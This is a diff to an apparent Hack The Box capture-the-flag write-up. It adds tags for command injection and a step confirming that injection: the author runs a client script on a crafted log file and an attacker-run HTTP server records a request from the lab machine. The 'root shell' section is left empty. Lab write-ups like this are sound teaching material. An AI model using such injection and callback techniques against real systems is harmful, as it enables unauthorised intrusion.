@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: gitbucket codereview informationleakage apachethrift wfuzz cache varnish haproxy xss crosssitescripting sessionhijacking webcachepoisoning h2csmuggling smugglingrequest copyparty lfi localfileinclusion authorized_keys ecdsa id_ecdsa
+tags: gitbucket codereview informationleakage apachethrift wfuzz cache varnish haproxy xss crosssitescripting sessionhijacking webcachepoisoning h2csmuggling smugglingrequest copyparty lfi localfileinclusion authorized_keys ecdsa id_ecdsa go python commandinjection user-agent
 ---
 
 <br />
@@ -1243,6 +1243,39 @@ This is the content of the `log` file we will use:
 
 <br />
 
+We execute the `client.py`:
 
+<br />
 
+```bash
+❯ python3 client.py /home/margo/lois.log
+Server response:
+Log file processed
+```
 
+<br />
+
+And if we check our python server...
+
+<br />
+
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.33 - - [01/Jul/2025 20:41:16] code 404, message File not found
+10.10.11.33 - - [01/Jul/2025 20:41:16] "GET /index.html HTTP/1.1" 404 -
+```
+
+<br />
+
+We received successfully the curl from the victim machine.
+
+### root shell:
+
+<br />
+
+```bash
+
+```
+
+<br />
